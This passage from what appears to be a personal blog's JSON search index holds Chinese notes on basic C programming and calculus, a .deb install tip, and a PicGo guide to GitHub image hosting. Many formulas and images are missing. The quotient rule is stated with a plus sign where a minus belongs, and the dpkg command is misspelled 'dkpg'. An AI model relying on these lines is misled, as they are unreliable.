n); &#125; printf(\"\\n\"); return 0;&#125;","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"select structure programming","slug":"select-structure-programming","date":"2020-10-25T09:16:20.000Z","updated":"2021-04-11T17:11:28.521Z","comments":true,"path":"select-structure-programming/","link":"","permalink":"https://kayleh.top/select-structure-programming/","excerpt":"","text":"选择结构程序设计选择结构和条件判断用if语句实现选择结构 if 关系运算符和关系表达式 关系运算符 描述 实例 == 检查两个操作数的值是否相等，如果相等则条件为真。 (A == B) 为假。 != 检查两个操作数的值是否相等，如果不相等则条件为真。 (A != B) 为真。 &gt; 检查左操作数的值是否大于右操作数的值，如果是则条件为真。 (A &gt; B) 为假。 &lt; 检查左操作数的值是否小于右操作数的值，如果是则条件为真。 (A &lt; B) 为真。 &gt;= 检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。 (A &gt;= B) 为假。 &lt;= 检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。 (A &lt;= B) 为真。 输入两个实数,按由小到大的顺序输出这两个数12345678910111213141516#include&lt;stdio.h&gt;int main()&#123; float a, b, t; scanf(\"%f,%f\", &amp;a, &amp;b); if (a &gt; b) &#123; //将a和b的值互换 t = a; a = b; b = t; &#125; printf(\"%5.2f,%5.2f\\n\", a, b); return 0;&#125; 输入3个数啊a,b,c,要求按由小到大的顺序输出.if语句的一般形式 if(表达式) 语句1 ​ [else 语句2] …….. 逻辑运算符和逻辑表达式 逻辑运算符 描述 实例 &amp;&amp; 称为逻辑与运算符。如果两个操作数都非零，则条件为真。 (A &amp;&amp; B) 为假。 \\ \\ 称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。 (A \\ \\ B) 为真。 ! 称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。 !(A &amp;&amp; B) 为真。 选择结构的嵌套用switch语句实现多分支选择结构要求按照考试成绩等级输出百分制分数制,A等为85分以上,B等为70~84分,C等为60~69分,D等为60分以下.成绩的等级由键盘输入. 123456789101112131415161718192021222324252627#include&lt;stdio.h&gt;int main()&#123; char grade; scanf(\"%c\", &amp;grade); printf(\"Yours Score:\"); switch (grade) &#123; case 'A': printf(\"85~100\"); break; case 'B': printf(\"70~84\"); break; case 'C': printf(\"60~69\"); break; case 'D': printf(\"&lt;60\"); break; default: printf(\"enter data error!\"); &#125; return 0;&#125;","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"sequential programming","slug":"sequential-programming","date":"2020-10-25T09:16:00.000Z","updated":"2021-04-11T17:11:28.524Z","comments":true,"path":"sequential-programming/","link":"","permalink":"https://kayleh.top/sequential-programming/","excerpt":"","text":"顺序程序设计求摄氏度 12345678910#include&lt;stdio.h&gt;int main()&#123; float f, c; f = 64.0; c = (5.0 / 9) * (f - 32); printf(\"f=%f\\nc=%f\\n\", f, c); return 0;&#125; 常量 整型常量 实性常量(有小数点) 十进制小数形式 指数形式:如12.34e3(e或E之前必须有数字,e或E之后必须为整数) 字符常量 普通字符,用单撇号括起来的一个字符 字符常量存储在计算机存储单元中时,并不是存储字符本身,而是以其代码(一般采用ASCII码)存储的 转义字符 字符串常量 用双撇号括起来的全部字符,双撇号内可以只有一个字符 符号常量 用#define指令,指定用一个符号名称代表一个常量 在预编译后,符号变量会全部被置换, 1#define PI 3.1415 //注意行末没有分号 变量变量代表一个有名字,具有特定属性的一个存储单元,它用来存放数据,在程序运行期间,变量的值时可以改变的. 变量必须先定义,后使用. 在定义时指定该变量的名字和类型. 从变量中取值,实际上时通过变量名找到相应的内存地址,从该存储单元中读取数据. 常变量在定义变量时,前面加一个关键字const 常变量与处理的异同? 有类型,占存储单元,不允许改变其值 常变量时有名字的不变量(便于在程序中被引用),而常量时没有名字的不变量 标识符一个对象的名字 数据类型 基本类型 整型类型 基本整型(int) 短整型(short int) 长整型(long int) 双长整型(long long int) 字符型(char) 布尔型(bool) 浮点类型 单精度浮点型(float) 双精度浮点型(double) 复数浮点型(float_complex,double_complex,long long_complex) 枚举类型(enum) 空类型(void) 派生类型 指针类型(*) 数组类型([ ]) 结构体类型(struct) 共用体类型(union) 函数类型 整型数据整数数据存储空间和值的范围 类型 字节数 取值范围 int 2 - 32768 ~ 32767 （5位十进制数） int 4 - 2147483648 ~ 2147483647 （10位十进制数） unsignde int 2 0 ~ 65535 （5位十进制数） unsignde int 4 0 ~ 4294967295 （10位十进制数） short 2 - 32768 ~ 32767 （5位十进制数） unsigned short 2 0 ~ 65535 （5位十进制数） long 4 - 2147483648 ~ 2147483647 （10位十进制数） usigned long 4 0 ~ 4294967295 （10位十进制数） long long 8 - 9223372036854775808 ~ 9223372036854775807（20位十进制数） unsigned long long 8 0 ~ 18446744073709551615 （20位十进制数） 字符型数据浮点型数据 c编译系统把浮点型常量都按双精度处理,分配8个字节 123float a = 3.14159f; //把此3.14159按单精度浮点常量处理,编译时不出现\"警告\"long double a = 1.23L; //把此,1.23作为long double型处理 运算符和表达式 算术运算符 描述 实例 + 把两个操作数相加 A + B 将得到 30 - 从第一个操作数中减去第二个操作数 A - B 将得到 -10 * 把两个操作数相乘 A * B 将得到 200 / 分子除以分母 B / A 将得到 2 % 取模运算符，整除后的余数 B % A 将得到 0 ++ 自增运算符，整数值增加 1 A++ 将得到 11 — 自减运算符，整数值减少 1 A— 将得到 9 关系运算符 描述 实例 == 检查两个操作数的值是否相等，如果相等则条件为真。 (A == B) 为假。 != 检查两个操作数的值是否相等，如果不相等则条件为真。 (A != B) 为真。 &gt; 检查左操作数的值是否大于右操作数的值，如果是则条件为真。 (A &gt; B) 为假。 &lt; 检查左操作数的值是否小于右操作数的值，如果是则条件为真。 (A &lt; B) 为真。 &gt;= 检查左操作数的值是否大于或等于右操作数的值，如果是则条件为真。 (A &gt;= B) 为假。 &lt;= 检查左操作数的值是否小于或等于右操作数的值，如果是则条件为真。 (A &lt;= B) 为真。 逻辑运算符 描述 实例 &amp;&amp; 称为逻辑与运算符。如果两个操作数都非零，则条件为真。 (A &amp;&amp; B) 为假。 \\ \\ 称为逻辑或运算符。如果两个操作数中有任意一个非零，则条件为真。 (A \\ \\ B) 为真。 ! 称为逻辑非运算符。用来逆转操作数的逻辑状态。如果条件为真则逻辑非运算符将使其为假。 !(A &amp;&amp; B) 为真。 位运算符 位运算符作用于位，并逐位执行操作。&amp;、 | 和 ^ 的真值表如下所示： p q p &amp; q p \\ q p ^ q 0 0 0 0 0 0 1 0 1 1 1 1 1 1 0 1 0 0 1 1 位运算符 描述 实例 &amp; 按位与操作，按二进制位进行”与”运算。运算规则：0&amp;0=0; 0&amp;1=0; 1&amp;0=0; 1&amp;1=1; (A &amp; B) 将得到 12，即为 0000 1100 \\ 按位或运算符，按二进制位进行”或”运算。运算规则：`0 0=0; 0 1=1; 1 0=1; 1 1=1;` (A \\ B) 将得到 61，即为 0011 1101 ^ 异或运算符，按二进制位进行”异或”运算。运算规则：0^0=0; 0^1=1; 1^0=1; 1^1=0; (A ^ B) 将得到 49，即为 0011 0001 ~ 取反运算符，按二进制位进行”取反”运算。运算规则：~1=0; ~0=1; (~A ) 将得到 -61，即为 1100 0011，一个有符号二进制数的补码形式。 &lt;&lt; 二进制左移运算符。将一个运算对象的各二进制位全部左移若干位（左边的二进制位丢弃，右边补0）。 A &lt;&lt; 2 将得到 240，即为 1111 0000 &gt;&gt; 二进制右移运算符。将一个数的各二进制位全部右移若干位，正数左补0，负数左补1，右边丢弃。 A &gt;&gt; 2 将得到 15，即为 0000 1111 赋值运算符 描述 实例 = 简单的赋值运算符，把右边操作数的值赋给左边操作数 C = A + B 将把 A + B 的值赋给 C += 加且赋值运算符，把右边操作数加上左边操作数的结果赋值给左边操作数 C += A 相当于 C = C + A -= 减且赋值运算符，把左边操作数减去右边操作数的结果赋值给左边操作数 C -= A 相当于 C = C - A *= 乘且赋值运算符，把右边操作数乘以左边操作数的结果赋值给左边操作数 C = A 相当于 C = C A /= 除且赋值运算符，把左边操作数除以右边操作数的结果赋值给左边操作数 C /= A 相当于 C = C / A %= 求模且赋值运算符，求两个操作数的模赋值给左边操作数 C %= A 相当于 C = C % A &lt;&lt;= 左移且赋值运算符 C &lt;&lt;= 2 等同于 C = C &lt;&lt; 2 &gt;&gt;= 右移且赋值运算符 C &gt;&gt;= 2 等同于 C = C &gt;&gt; 2 &amp;= 按位与且赋值运算符 C &amp;= 2 等同于 C = C &amp; 2 ^= 按位异或且赋值运算符 C ^= 2 等同于 C = C ^ 2 \\ = 按位或且赋值运算符 C \\ = 2 等同于 C = C \\ 2 杂项运算符 描述 实例 sizeof() 返回变量的大小。 sizeof(a) 将返回 4，其中 a 是整数。 &amp; 返回变量的地址。 &a; 将给出变量的实际地址。 * 指向一个变量。 *a; 将指向一个变量。 ? : 条件表达式 如果条件为真 ? 则值为 X : 否则值为 Y 语句赋值语句赋值运算符 1&#x3D; 复合的赋值运算符 123a+=3 等价于a=a+3;x*=y+8 等价于x=x*(y+8);x%=3 等价于x=x%3; 赋值表达式 1变量 赋值运算符 表达式 赋值过程中的类型转换 123456781将浮点型数据(包括单,双精度)赋给整型变量时,先对浮点数取整,即舍弃小数部分,然后赋予整型变量;2将整型数据赋值给单,双精度变量时,数值不变,但以浮点数形式存储到变量中.3将一个double型赋给一float变量时,先将双精度数转换为单精度,即只取6~7位有效数字,存储到float型变量的4个字节中.4字符型数据赋给整型变量时,将字符的ASCII代码赋给整型变量5将一个占字节多的整型数据赋给一个占字节少的整型变量或字符变量(例如把占4个字节的int型数据赋给占2个字节的short变量或占1个字节的char变量)时,只将其低字节原封不动地送到被赋值的变量(即发生&quot;截断&quot;),如:int i&#x3D;289;char c &#x3D;&#39;a&#39;;c&#x3D;i; 数据的输入输出1234printf();scanf();putchar();getchar(); 12","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"C algorithm","slug":"C-algorithm","date":"2020-10-25T09:15:22.000Z","updated":"2021-04-11T17:11:28.108Z","comments":true,"path":"C-algorithm/","link":"","permalink":"https://kayleh.top/C-algorithm/","excerpt":"","text":"算法1.什么是算法?算法（Algorithm）是指解题方案的准确而完整的描述，是一系列解决问题的清晰指令，算法代表着用系统的方法描述解决问题的策略机制。也就是说，能够对一定规范的输入，在有限时间内获得所要求的输出。 2.什么叫结构化算法?为什么要提倡结构化算法?结构化算法是由一些基本结构顺序组成的，就是把一个大的功能的实现分隔为许多个小功能的实现。 自顶向下,逐步细化,模块化设计,结构化编码","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"C programming","slug":"C-programming","date":"2020-10-25T09:14:40.000Z","updated":"2021-04-11T17:11:28.118Z","comments":true,"path":"C-programming/","link":"","permalink":"https://kayleh.top/C-programming/","excerpt":"","text":"程序1.什么是程序?什么是程序设计?程序是一组计算机能识别和执行的指令，运行于电子计算机上，满足人们某种需求的信息化工具。程序设计（programming），是给出解决特定问题程序的过程，软件开发过程中的重要步骤。程序设计往往以某种程序设计语言为工具，给出这种语言下的程序。程序设计过程一般包括分析、设计、编码、测试、调试等不同阶段。 2.为什么需要计算机语言?高级语言有哪些特点?人和计算机交流信息需要解决语言问题,需要创造一种计算机和人都能识别的语言. 高级语言是从人类的逻辑思维角度出发的计算机语言，抽象程度大大提高，需要经过编译成特定机器上的目标代码才能执行，一条高级语言的语句往往需要若干条机器指令来完成。高级语言独立于机器的特性是靠编译器为不同机器生成不同的目标代码(或机器指令)来实现的。 3.正确解释一下名词以及含义:(1)源程序,目标程序,可执行程序。 源程序：指未编译的按照一定的程序设计语言规范书写的文本文件，是一系列人类可读的计算机语言指令 目标程序：为源程序经编译可直接被计算机运行的机器码集合，在计算机文件上以.obj作扩展名 可执行程序：将所有编译后得到的目标模块连接装配起来，在与函数库相连接成为一个整体，生成一个可供计算机执行的目标程序，成为可执行程序 (2)程序编辑,程序编译,程序连接。程序编辑：上机输入或者编辑源程序。 程序编译： 先用C提供的“预处理器”，对程序中的预处理指令进行编译预处理 对源程序进行语法检查， 判断是否有语法错误，直到没有语法错误未知 编译程序自动把源程序转换为二进制形式的目标程序 程序连接：将所有编译后得到的目标模块连接装配起来，在与函数库相连接成为一个整体的过程称之为程序连接 (3)程序,程序模块,程序文件。程序：一组计算机能识别和执行的指令，运行于电子计算机上，满足人们某种需求的信息化工具 程序模块：可由汇编程序、编译程序、装入程序或翻译程序作为一个整体来处理的一级独立的、可识别的程序指令 程序文件：程序的文件称为程序文件，程序文件存储的是程序，包括源程序和可执行程序 (4)函数,主函数，被调用函数,库函数。函数：将一段经常需要使用的代码封装起来，在需要使用时可以直接调用，来完成一定功能 主函数：又称main函数，是程序执行的起点 被调用函数：由一个函数调用另一个函数，则称第二个函数为被调用函数 库函数：一般是指编译器提供的可在c源程序中调用的函数。可分为两类，一类是c语言标准规定的库函数，一类是 编译器特定的库函数 (5)程序调试,程序测试。程序调试：是将编制的程序投入实际运行前，用手工或编译程序等方法进行测试，修正语法错误和逻辑错误的过程 程序测试：是指对一个完成了全部或部分功能、模块的计算机程序在正式使用前的检测，以确保该程序能按预定的 方式正确地运行 4.编写一个c程序,运行时输出Hello World! 1234567#include&lt;stdio.h&gt;int main()&#123; printf(\"Hello World!\"); return 0;&#125; 5.编写一个c程序,运行时输出一下图形*** ​ *** ​ *** ​ *** 12345678910#include&lt;stdio.h&gt;int main()&#123; printf(\"*****\\n\"); printf(\" *****\\n\"); printf(\" *****\\n\"); printf(\" *****\\n\"); return 0;&#125; 6.编写一个c程序,运行时输入a,b,c三个值,输出其中值最大值12345678910111213141516171819#include&lt;stdio.h&gt;int main()&#123; int a, b, c, max; printf(\"input 3 number:\"); scanf(\"%d%d%d\", &amp;a, &amp;b, &amp;c); max = a; if (max &lt; b) &#123; max = b; &#125; if (max &lt; c) &#123; max = c; &#125; printf(\"max:%d\", max); return 0;&#125;","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://kayleh.top/tags/C/"}]},{"title":"ubuntu.deb安装包","slug":"ubuntu-deb安装包","date":"2020-10-06T05:16:50.000Z","updated":"2021-04-11T17:11:28.527Z","comments":true,"path":"deb/","link":"","permalink":"https://kayleh.top/deb/","excerpt":"","text":"1dkpg -i xxxx.deb 需要超级用户权限 1sudo dkpg -i xxxx.deb","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://kayleh.top/tags/linux/"}]},{"title":"微分方程","slug":"微分方程","date":"2020-10-05T06:55:36.000Z","updated":"2021-04-11T17:11:28.876Z","comments":true,"path":"differential-equation/","link":"","permalink":"https://kayleh.top/differential-equation/","excerpt":"","text":"微分方程 定义： 微分方程的阶：导数的最高阶数 二阶： 通解独立常数的个数=阶数，比如二阶的最终的解里有c1，c2两个独立的常数 特解如果常数都确定的解叫特解 初始条件解题过程一般把初始条件代入到通解里，确定常数的值，得到的就是特解 一阶微分方程可分离变量 分离变量，同时积分 例题： 齐次方程dy/dx=f(y/x) 例题 ​ ↓ 一阶线性方程 一阶线性齐次微分方程： 齐次方程的解 非齐次方程的解： 例题 #伯努利方程","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"级数","slug":"级数","date":"2020-10-03T21:24:36.000Z","updated":"2021-04-11T17:11:28.982Z","comments":true,"path":"series/","link":"","permalink":"https://kayleh.top/series/","excerpt":"","text":"无穷级数等比数列 例题 调和级数 调和级数是发散的 性质 相反则未必 敛散性不变 如果级数收敛，通项是趋于0的。 通项趋于0，未必是收敛的， 通项不趋于0，一定是不收敛的。 例题： 通项不趋于0必发散 去掉了第一项，敛散性不变 正项级数大收必小收 小散必大散 例题 公式 例题 等于1说明分子分母有相同的敛散性,1/n是发散的 达朗贝尔判别法1 2 解题过程： 任意项级数和调和级数相比，这个是收敛的(“交错调和级数”) 例题： 证明$U^n$是递减的 绝对值级数定理： 绝对收敛 例题： 先取绝对值，p级数是收敛的，这个就是绝对收敛的。 取绝对值，是调和级数发散的，但是原来的是交错调和级数是收敛的，所以是条件收敛 定理 例题： 总结 例题： 性质：","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"二重积分","slug":"二重积分","date":"2020-10-01T22:43:15.000Z","updated":"2021-04-11T17:11:28.576Z","comments":true,"path":"double-integral/","link":"","permalink":"https://kayleh.top/double-integral/","excerpt":"","text":"概念体积 几何含义 性质 直角坐标系的计算 例题： x型是从左到右走 上边的函数写成上限，下边的函数写成下限 y型是从下到上走 左边的函数写成下限，右边的函数写成上限 特殊矩形 分成两部分的： 极坐标的计算极坐标 二重积分写成极坐标的表达方式 例题： $-e^{-x}$求导是$e^{-x}$","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"偏导数","slug":"偏导数","date":"2020-09-29T21:38:35.000Z","updated":"2021-04-11T17:11:28.617Z","comments":true,"path":"partial-derivative/","link":"","permalink":"https://kayleh.top/partial-derivative/","excerpt":"","text":"在某点偏导的定义 对y求导时，是把x看作常数，对y求导 对x求导时，是把y看作常数，对x求导 多元函数可导不连续 例题： 几何意义 二阶偏导数和混合偏导 先求x再求y跟先求y再求x时一样的 如果两个混合二阶偏导数在区域d上是连续的。 全微分 x，y都发生的变化引起了z的变化 定义： 可微必要条件 偏导存在只是可微的必要条件。 可微的充分条件 一个全微分等于两个偏微分之和。 例题： 多元复合函数求导 x对x求导=1 例题： 隐函数求导定理1 例题： 定理2： 例题 定理3例题： #克莱姆法则 二元函数的极值","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"多元函数","slug":"多元函数","date":"2020-09-28T09:10:02.000Z","updated":"2021-04-11T17:11:28.841Z","comments":true,"path":"multi-function/","link":"","permalink":"https://kayleh.top/multi-function/","excerpt":"","text":"空间解析几何 两点之间距离 平面方程 球面方程 z是正的表示求的上半部分，负的表示下半部分。 旋转抛物面： 双曲抛物面： 多元函数邻域 开集：所有的点都是内点 闭区域：既包含内点和边界点 二元函数的极限 证明极限不存在 找两种不同的逼近方式 例题： 求极限 连续","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"广义积分和瑕积分","slug":"广义积分","date":"2020-09-28T05:58:19.000Z","updated":"2021-04-11T17:11:28.866Z","comments":true,"path":"generalized-integral/","link":"","permalink":"https://kayleh.top/generalized-integral/","excerpt":"","text":"广义积分 无穷限积分①上限是无穷的，就对b求导 如果极限存在，就是收敛的，如果不存在，就是发散的。 ②下限是无穷的，就对a求导 ③上下限都是无穷 结合①和②来求。 例题： 广义的牛顿-莱布尼茨公式 总结： 性质 -也收敛 2）第二个性质。反之，不一定 分部积分和换元积分也成立。 收敛判定定理： ★★★比较判别法 大敛则小敛，小散大必散 找一个比被积函数大的易比函数进行比较 绝对收敛、条件收敛 绝对收敛必收敛 #瑕积分","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"定积分","slug":"定积分","date":"2020-09-26T04:38:49.000Z","updated":"2021-04-11T17:11:28.849Z","comments":true,"path":"definite-integral/","link":"","permalink":"https://kayleh.top/definite-integral/","excerpt":"","text":"定积分性质 插入分点，区间内取任意值，求任意值的函数值，$△x_n$小区间的长度 拉姆达是最大的区间 定义$f(x)$在$[a,b]$有界，在$[a,b]$任意插入分点 分成n个区间，△x_1,△x_2….△x_n,任取一点 $\\xi_i$ \\int_a^b{f(x)dx}=\\lim_{\\lambda \\to 0} \\sum_{i=1}^n{f(\\xi_i)△x_i}\\lambda=max\\{△x_1...△x_n\\}注意： 两个图像都是一样的 定理1）连续就可积 2）有界，有限个间断点，可积 几何意义 ②积分等于面积的相反数 例题 定积分的近似计算矩形法 梯形法 抛物线法 性质1）当b=a时， \\int_a^a{f(x)=0}2）\\int_a^b{f(x)dx}= - \\int_b^a{f(x)dx} 不管是a&lt;c&lt;b还是a&lt;b&lt;c,性质2公式都成立 推论 性质6 定积分中值定理 f(x)必须是连续的 在最小值和最大值之间一定能找到一点$\\xi$ 函数值$f(\\xi)$就是平均值。 微积分的基本原理积分上限函数 x是变化的 定义 积分上限函数p(x)是连续的 定理如果f(x)在[a,b]上连续，那么p(x)在积分区域上可导 p'(x)=f(x)1)如果上限是x，直接将x代入被积函数 2)如果x是下限，取相反数，再直接将x代入被积函数 3）如果上限是x的函数g(x) 复合函数求导——链式法则 1.把上限g(x)直接代入被积函数 2.对上限求导g’(x) 4）如果上限是x的函数h(x) 1.把上限h(x)直接代入被积函数 2.对上限求导h’(x) 3.取相反数，加负号 5）上下都是x的函数， 可以根据积分的性质，在h(x)和g(x)之间任取一点C，求h(x)到c的积分和c到g(x)的积分。 例题 牛顿莱布尼茨公式 例题： 定积分的换元积分法 例题： 3ln3 sin的值是1到-1来回波动，在因为a是正的，所以就是从0到1的范围 又可以这么写： ★ 积分区间关于原点对称 例题： $1+x^2$分之1是arctanx的导数，提出去所以是对$(arctanx)^2$求导 证明： sin（派/2-X）= cosx 同时求导 定积分的分部积分法 例题： =1/2 优先级：反对幂三指 应用求面积 x型：垂直于x轴 求体积 经济问题","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"图床","slug":"图床","date":"2020-09-25T04:45:24.000Z","updated":"2021-04-11T17:11:28.818Z","comments":true,"path":"pictrue-bed/","link":"","permalink":"https://kayleh.top/pictrue-bed/","excerpt":"","text":"原地址https://www.jianshu.com/u/e68ebf1b004c Github repo图床Github的repo也可以储存东西，最直接的就是程序的版本控制，当然也可以用来当作备份储存，用来储存图片（github官方回复是：该行为不构成abuse，如果把github当图床算滥用，那么那么多人把微博当图床怎么就理所应当捏）。其实github对于国内的响应速度并不快，而且时不时被block，所以用github当图床完全是出于储存个人用途的自创图片，并不能当CDN使用。github自从被微软收购后，我对github的信心大增，代码以前只敢用git管理保存在本地，现在可以放心大胆上传到github了（很多是private，所以不可见），github图床主要就是图个稳定，也并不是想恶意刷github服务器的流量，恶意影响大家的体验。 新建repo，名称任意 打开账户/Settings/Developer settings/Personal access tokens,点击Generate new token image image 在弹出的产生token页面，Token description随意填写，但是一定要勾选上这几项 image 下载PicGo客户端对应的版本并安装，github地址：https://github.com/Molunerfinn/PicGo/releases 启动PicGo后，打开设置界面，点击 image 在第一栏填入你的github名称/repo名称；在第二栏填入你的分支名称，默认为master；在第三栏填入你刚才申请到的Token；第四栏填入你的repo中的储存路径；最后点击确认，再点击设为默认图床 使用QQ截图Ctrl+Alt+A或者微信的Alt+A截图后，按下Ctrl+Shiht+P快捷键即可自动上传到github对应的repo中，上传完成后，会有提示，自动将对应的图片地址送入剪贴板中，直接Ctrl+V即可粘贴对应的地址出来了~~","categories":[],"tags":[{"name":"front","slug":"front","permalink":"https://kayleh.top/tags/front/"}]},{"title":"不定积分","slug":"不定积分","date":"2020-09-23T01:06:12.000Z","updated":"2021-04-11T17:11:28.550Z","comments":true,"path":"indefinite-integral/","link":"","permalink":"https://kayleh.top/indefinite-integral/","excerpt":"","text":"$F’(x)=f(x)$ $F(x)$是$f(x)$的一个原函数. F(x)是f(x)的一个原函数，F(x)+c也是f(x)的原函数 $f(x)$是$F’(x)$的导函数. 知道$F’(x)$,$f(x)$只有唯一一个 知道$f(x)$,$F’(x)$可以有无穷多个 不定积分$f(x)$的原函数的全体 $\\int_{}{}f(x) \\text{d}x$ $\\int_{}{}$: sum,积分符号 $x$: 积分变量 $f(x)$: 被积函数 $\\int_{}{}f(x) \\text{d}x = F(x)+c$ 例题1) $\\int_{}{}x^2 \\text{d}x = \\frac{1}{3}x^3+c$ 几何意义 性质 \\int_{}{}kf(x)\\text{d}x=k\\int_{}{}f(x)\\text{d}xk可以朝外拿： ①k是常数 ②k是与x无关的另变量 有限个可以，但无限个不能 基本积分公式 例题： 积分法第一换元积分法(凑微分法) 求原函数 1）把d外面的某项拿到d里面(变成原函数) 2）凑基本积分公式 例题：dk()=kd() d()里面的项可以随意加减常数 第二换元积分 求导 公式分部积分法 优先： $e^x,sinx,cosx,x(x^n),lnx,arctanx$ 有理函数积分分子的最高次数比较高： 最高次数相等(最终使分母次数高)： 所有方法都要化成分母次数比分子次数高。 真分式分母次数比分子次数高的叫做真分式 第一类题目 1）$b^2-4ac=0$ $ax^2+bx+c=0$ $a(x-x_1)^2=0$ 例如： 2）$b^2-4ac&gt;0$ $ax^2+bx+c=0$有两个不等的根 $a(x-x_1)(x-x_2)=0$ 待定系数法： 3）$b^2-4ac&lt;0$ $ax^2+bx+c=0$没有实根 第二类题目 1）$b^2-4ac=0$ $ax^2+bx+c=0$ 2）$b^2-4ac&gt;0$ 待定系数法： 3）$b^2-4ac&lt;0$ 第三类题目 第一类表达式 比如： 3） 第二类 解法： 左右相等： $A_1+2A_2=0$平方项 $A_2+2A_3=0$1次项 $A_1+A_3=1$常数项 或者：","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"函数作图","slug":"函数作图","date":"2020-09-22T21:41:02.000Z","updated":"2021-04-11T17:11:28.623Z","comments":true,"path":"function-graphing/","link":"","permalink":"https://kayleh.top/function-graphing/","excerpt":"","text":"渐近线 水平、垂直、斜 水平渐近线 例题： 垂直渐近线 斜渐近线 例题： 分子次数比分母高，取无穷 分子与分母次数一样，极限等于最高次的系数之比 微分法作图 “导数” 例如：","categories":[{"name":"高数","slug":"高数","permalink":"https://kayleh.top/categories/%E9%AB%98%E6%95%B0/"}],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"极值和最值","slug":"极值和最值","date":"2020-09-20T07:04:06.000Z","updated":"2021-04-11T17:11:28.918Z","comments":true,"path":"extreme-value-and-maximum-value/","link":"","permalink":"https://kayleh.top/extreme-value-and-maximum-value/","excerpt":"","text":"极值和最值定理：f(x)在$x_0$可导，且在$x_0$取极值。$f’(x_0)=0$ 证明： 求极值 例题： 定理： f(x)的二阶导数也等于0的时候，不能判断： 最值极值是局部区域的，最值是全部区域 求最值找到这几个点： 连续并单调的函数，最值就是端点； 在区间内的极值就是最值。","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"函数的单调性和凸凹性","slug":"函数的单调性和凸凹性","date":"2020-09-19T21:00:16.000Z","updated":"2021-04-11T17:11:28.633Z","comments":true,"path":"monotonicity-and-convexity-of-functions/","link":"","permalink":"https://kayleh.top/monotonicity-and-convexity-of-functions/","excerpt":"","text":"单调性 增f’(x)&gt;0减f’(x)&lt;0 f’(x)≥0，等号在个别点上成立，仍然也是增函数 f’(0)不存在,左右导数 凸凹性定义： 利用拉格朗日中值定理： 例题： 求凸凹区间和拐点： f‘’不存在：","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"洛必达法则","slug":"洛必达法则","date":"2020-09-19T06:31:17.000Z","updated":"2021-04-11T17:11:28.942Z","comments":true,"path":"law-of-robida/","link":"","permalink":"https://kayleh.top/law-of-robida/","excerpt":"","text":"洛必达法则两种形式：\\frac{0}{0}\\frac{\\infty}{\\infty} \\frac{0}{0} 例题： 重要极限也可以用洛必达法则证明： 必须是$\\frac{0}{0}$型或$\\frac{\\infty}{\\infty}$型才可以再次求导。 \\frac{\\infty}{\\infty}其实和$\\frac{0}{0}$没区别： 例题： 趋于正无穷的速度： 对数&lt;幂函数&lt;指数函数 洛必达法则注意1)只有$\\frac{0}{0}$或$\\frac{\\infty}{\\infty}$才用 2)不要一味求导，与重要极限、等价无穷小替换结合 3) 例题：","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"微分","slug":"微分","date":"2020-09-17T07:39:06.000Z","updated":"2021-04-11T17:11:28.874Z","comments":true,"path":"differential/","link":"","permalink":"https://kayleh.top/differential/","excerpt":"","text":"微分 微分的定义： 充要条件 可微就可导，可导就可微 A就是$x_0$上的导数 dy=f^{'}(x)△x=f^{'}(x)dx$△x=dx$是精确值，$△y≈dy$是近似值 导数也叫微商 ，导数定义的dy是对dx求导，可以看做一个整体： 例题： 微分的几何意义 基本公式$dc=c’dx=0$ 略 四则运算 例题： 不变性： 微分应用 近似计算 f(x_0+△x)≈f(x_0)+f'(x_0)△x ，|△x|取很小 例题： 微分中值定理费马定理 左导数和右导数要想相等，只能等于0 ∴$f^{‘}(x_0)=0$ 驻点：导数为0的点就叫驻点。 罗尔定理 拉姆朗日中值定理 f(x)在区间I连续，I内可导且导数恒为0。f(x)=C 证明： 柯西中值定理由拉姆朗日中值定理推出： 柯西能推出拉格朗日定理，拉格朗日能推出罗尔 #泰勒定理 定理：$f(x)$表示成$x-x_0$的n次多项式+$R_n (x)$","categories":[],"tags":[{"name":"math","slug":"math","permalink":"https://kayleh.top/tags/math/"}]},{"title":"导数","slug":"导数","date":"2020-09-15T08:20:05.000Z","updated":"2021-04-11T17:11:28.852Z","comments":true,"path":"derivative/","link":"","permalink":"https://kayleh.top/derivative/","excerpt":"","text":"变化率$x_0 \\to x_0+△x$. $f(x_0) \\to f(x_0+△x)$ $\\frac{f(x_0+△x)-f(x_0)}{△x}$ 从x_0到x_0+△x的平均变化率 导数的四个符号 导数的三种表达方式 例题：1) $y=x^2$ $y’$ $y’|_{x=2}$ =4; 求导 导数意义 例题： 求$y=x^3$在(1,1)的切线和法线 左右导数，左右导数都存在并相等 求导法则：(1)$u(x)、v(x)$可导，$(u(x)+v(x))’=u’(x)+v’(x)$ (2)$(uv)’=u’v+uv’$ (3)$\\frac{u}{v}=\\frac{u’v+uv’}{v^2}$ 反函数求导法则：$y=f(x)$ . $x=\\phi(y)$ 反函数=导数的倒数 